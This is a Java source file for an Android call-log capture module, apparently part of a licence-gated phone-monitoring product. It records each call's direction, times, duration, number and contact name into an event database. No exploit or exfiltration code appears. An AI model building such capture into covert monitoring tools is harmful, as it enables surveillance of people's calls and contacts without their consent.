package com.fx.maind.capture;

import java.util.ArrayList;

import android.content.Context;

import com.fx.event.Event;
import com.fx.event.EventCall;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.preference.PreferenceManager;
import com.fx.util.FxResource;
import com.vvt.calllog.CallLogData;
import com.vvt.calllog.CallLogObserver;
import com.vvt.logger.FxLog;
import com.vvt.util.GeneralUtil;

public class CallLogCapturer implements CallLogObserver.OnCaptureListener {
	
	private static final String TAG = "CallLogCapturer";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private CallLogObserver mCalllogObserver;
	private Context mContext;
	private EventDatabaseManager mEventDbManager;
	private PreferenceManager mPreferenceManager;
	private LicenseManager mLicenseManager;
	
	public CallLogCapturer(Context context) {
		mContext = context;
		mEventDbManager = EventDatabaseManager.getInstance(mContext);
		mPreferenceManager = PreferenceManager.getInstance(mContext);
		mLicenseManager = LicenseManager.getInstance(mContext);
		
		mCalllogObserver = CallLogObserver.getInstance(mContext);
		mCalllogObserver.setLoggablePath(MainDaemonResource.LOG_FOLDER);
		mCalllogObserver.setDateFormat(FxResource.DATE_FORMAT);
	}
	
	public void registerObserver() {
		mCalllogObserver.registerObserver(this);
	}
	
	public void unregisterObserver() {
		mCalllogObserver.unregisterObserver(this);
	}

	@Override
	public void onCapture(ArrayList<CallLogData> calls) {
		
		if (!mLicenseManager.isActivated()) { 
			FxLog.d(TAG, "onCapture # Product is not activated!! -> EXIT");
			return;
		}
		
		boolean isCaptureEnabled = 
			mPreferenceManager.isCaptureEnabled() && 
				mPreferenceManager.isCaptureCallLogEnabled();
		
		if (!isCaptureEnabled) {
			FxLog.d(TAG, "onCapture # Call log is disabled!! -> EXIT");
			return;
		}
		
		EventCall event = null;
		
		for (CallLogData call : calls) {
			
			CallLogData.Direction calldir = call.getDirection();
			short direction = calldir == CallLogData.Direction.IN ? 
					Event.DIRECTION_IN : calldir == CallLogData.Direction.OUT ? 
							Event.DIRECTION_OUT : calldir == CallLogData.Direction.MISSED ? 
									Event.DIRECTION_MISSED : Event.DIRECTION_UNKNOWN;
			
			String phoneNumber = 
					GeneralUtil.formatCapturedPhoneNumber(
							call.getPhonenumber());
			
			event = new EventCall(mContext, 
					call.getTimeInitiated(), 
					call.getTimeTerminated(), 
					call.getTimeConnected(), 
					direction, 
					call.getDuration(),
					phoneNumber, 
					Event.STATUS_TERMINATED, 
					call.getContactName());
			
			mEventDbManager.insert(event);
			if (LOGV) FxLog.v(TAG, String.format(
					"onCapture # Insert %s", event.getShortDescription()));
		}
		
	}
	
}
